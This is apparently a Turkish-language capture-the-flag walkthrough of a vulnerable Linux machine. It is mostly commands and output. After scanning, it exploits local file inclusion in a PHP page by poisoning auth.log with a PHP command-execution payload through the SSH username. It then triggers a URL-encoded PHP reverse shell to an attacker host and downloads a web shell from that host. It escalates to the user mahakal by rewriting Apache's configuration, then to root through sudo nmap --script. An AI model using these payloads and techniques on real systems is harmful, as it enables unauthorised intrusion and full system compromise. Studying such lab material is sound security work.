@@ -1,0 +1,137 @@
+      ####Enumeration
+
+Nmap
+nmapBir tarama çalıştırarak başlıyoruz :
+kali@kali:~# sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 13:29 EDT
+Nmap scan report for $targetip
+Host is up (0.032s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Dirb kullanarak , /consoledirb öğesini ortaya çıkarmak için web dizinlerini kaba kuvvet uygulayabiliriz :
+kali@kali:~# dirb http://$targetip
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+...
+==> DIRECTORY: http://$targetip/console/
+...
+Orada gezinmek (http://$targetip/console/) dizin listesini gösterir. Mevcut tek dosya file.php'dir .
+http://$targetip/console/file.php adresine gittiğimizde boş bir sayfa görüyoruz. 
+Ancak, bazı tahmin çalışmaları uygulayarak, GET parametresine yerel bir sistem dosyası eklersek file(http://$targetip/console/file.php?file=/etc/passwd), ilginç bir şey görürüz:
+$censored /etc/passwd file
+Ancak, /var/log/auth.log dosyasına erişimimiz var ve onu zehirleyebiliriz .
+
+      ####Exploitation
+
+Auth Log Zehirlenmesi
+/var/log/auth.log dosyasını http://$targetip/console/file.php?file=/var/log/auth.log adresindeki LFI'ye dahil edebildiğimizi gördük .
+Böylece o dosya zehirlenmeye müsaittir. Bazı PHP kodlarını bir SSH oturumuna aşağıdaki gibi tanıtacağız:
+kali@kali:~# ssh '<?php system($_GET['cmd']); ?>'@$targetip
+<?php system($_GET[cmd]); ?>@$targetip's password: 
+Permission denied, please try again.
+^C
+
+      ####Reversel Shell
+4444 numaralı bağlantı noktasında bir netcat dinleyicisi başlatın. Basit bir PHP ters kabuğu kullanacağız:
+php -r '$sock=fsockopen("$attackerip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+Yükün URL kodlu olması gerekir:
+php%20-r%20%27%24sock%3Dfsockopen%28%22$attackerip%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+Netcat dinleyicisi çalışırken, aşağıdaki URL'ye giderek ters kabuğu tetikleyebiliriz:
+http://$targetip/console/file.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22$attackerip%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+kali@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+192.168.120.170: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 48876
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/console$
+
+      ####Local Enumeration
+Sudo ayrıcalıklarımızı kontrol ederek Apache web sunucusunu başlatabilir, durdurabilir ve yeniden başlatabiliriz:
+www-data@ubuntu:/var/www/html/console$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/systemctl start apache2
+    (ALL) NOPASSWD: /bin/systemctl stop apache2
+    (ALL) NOPASSWD: /bin/systemctl restart apache2
+www-data@ubuntu:/var/www/html/console$
+Hedefe bir PHP ters kabuğu indirin:
+kali@kali:~# sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+$targetip - - [19/Aug/2020 08:03:12] "GET /shell.php HTTP/1.1" 200 -
+www-data@ubuntu:/var/www/html/console$ wget http://$attackerip/shell.php
+wget http://$attackerip/shell.php
+--2020-08-19 05:03:12--  http://$attackerip/shell.php
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5495 (5.4K) [application/octet-stream]
+Saving to: 'shell.php'
+
+shell.php           100%[===================>]   5.37K  --.-KB/s    in 0s      
+
+2020-08-19 05:03:12 (155 MB/s) - 'shell.php' saved [5495/5495]
+
+www-data@ubuntu:/var/www/html/console$
+/etc/passwd/home/mahakal:/bin/bash ' de gördüğümüzü hatırlayarak , web sunucusunu o kullanıcı olarak çalıştırmayı deneyeceğiz:
+www-data@ubuntu:/var/www/html/console$ cp /etc/apache2/apache2.conf .
+cp /etc/apache2/apache2.conf .
+www-data@ubuntu:/var/www/html/console$ sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
+<ser ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
+www-data@ubuntu:/var/www/html/console$ sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
+<p ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
+www-data@ubuntu:/var/www/html/console$
+www-data@ubuntu:/var/www/html/console$ cp apache2.conf /etc/apache2/apache2.conf
+</console$ cp apache2.conf /etc/apache2/apache2.conf
+www-data@ubuntu:/var/www/html/console$ sudo /bin/systemctl restart apache2
+sudo /bin/systemctl restart apache2
+Terminated
+Web hizmetinin yeniden başlatılması biraz zaman alır. 5555 numaralı bağlantı noktasında bir netcat dinleyicisi başlatın ve ardından http://$targetip/console/shell.php adresine giderek ters kabuğu tetikleyin:
+kali@kali:~# nc -lvp 5555
+listening on [any] 5555 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 51298
+Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 05:07:03 up 11 min,  1 user,  load average: 0.01, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty1     -                04:55   10:47   0.04s  0.03s -bash
+uid=1001(mahakal) gid=1001(mahakal) groups=1001(mahakal)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+mahakal@ubuntu:/$ id 
+id
+uid=1001(mahakal) gid=1001(mahakal) groups=1001(mahakal)
+mahakal@ubuntu:/$
+
+      ####Nmap
+Sudo izinlerimizi kontrol ettiğimizde, nmap şifre girmeden yükseltilmiş ayrıcalıklarla çalışabileceğimizi gösteriyor:
+mahakal@ubuntu:/$ sudo -l
+sudo -l
+Matching Defaults entries for mahakal on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mahakal may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/nmap
+Bu yanlış yapılandırma, etkileşimli bir sistem kabuğu oluşturarak kısıtlı ortamlardan çıkmak için kötüye kullanılabilir. 
+Bayrağı , aşağıdakiler de dahil olmak üzere, --script isteğe bağlı bir komut dosyası veya programa yönlendirmek için kullanabiliriz :nmap/bin/sh
+mahakal@ubuntu:/$ TF=$(mktemp) 
+TF=$(mktemp)
+mahakal@ubuntu:/$ echo 'os.execute("/bin/sh")' > $TF
+echo 'os.execute("/bin/sh")' > $TF
+mahakal@ubuntu:/$ sudo -u root nmap --script=$TF
+sudo -u root nmap --script=$TF
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-18 11:36 PDT
+NSE: Warning: Loading '/tmp/tmp.PfIVAryuiV' -- the recommended file extension is '.nse'.
+# id
+uid=0(root) gid=0(root) groups=0(root)  
